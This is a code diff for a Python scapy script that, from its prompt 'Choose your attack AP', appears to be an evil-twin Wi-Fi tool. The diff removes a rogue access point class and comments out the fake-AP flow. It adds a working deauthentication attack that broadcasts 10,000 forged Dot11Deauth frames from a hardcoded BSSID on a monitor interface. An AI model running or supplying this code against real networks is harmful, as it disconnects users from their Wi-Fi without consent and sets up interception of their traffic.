@@ -1,5 +1,5 @@
 import ifcfg
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
 from scapy.layers.l2 import ARP, Ether
 from wifi import Cell, Scheme
 from scapy.all import *
@@ -54,17 +54,6 @@ def checkFotRoot():
         sys.exit("\nOnly root can run this script\n")
 
 
-class AP:
-    def __init__(self, wlan):
-        self.wlan = wlan
-        #self.ssid = ssid
-        self.ap =  pyaccesspoint.AccessPoint(wlan=wlan, ssid='sergey',password="123456789")
-
-    def start(self):
-        self.ap.start()
-    def stop(self):
-        self.ap.stop()
-
 def apRescanHandler(interface):
     devices = (list(printAP(interface)))
     attSsid = input("\nChoose your attack AP or \"R\" fore rescan: ")
@@ -98,9 +87,14 @@ def stopAP():
 
 
 if __name__ == "__main__":
-     checkFotRoot()
-     apDevice = chooseDevice()
-     ssid = apRescanHandler(apDevice)
-     startAP(ssid, apDevice)
+     # checkFotRoot()
+     # apDevice = chooseDevice()
+     # ssid = apRescanHandler(apDevice)
+     # startAP(ssid, apDevice)
      #os.system('trackerjacker -i ' + apDevice + ' --map')
 
+     brdmac = "ff:ff:ff:ff:ff:ff"
+
+     pkt = RadioTap() / Dot11(addr1=brdmac, addr2="A4:91:B1:8A:A4:46", addr3="A4:91:B1:8A:A4:46") / Dot11Deauth()
+
+     sendp(pkt, iface="wlp0s20f0u2mon", count=10000, inter=.2)
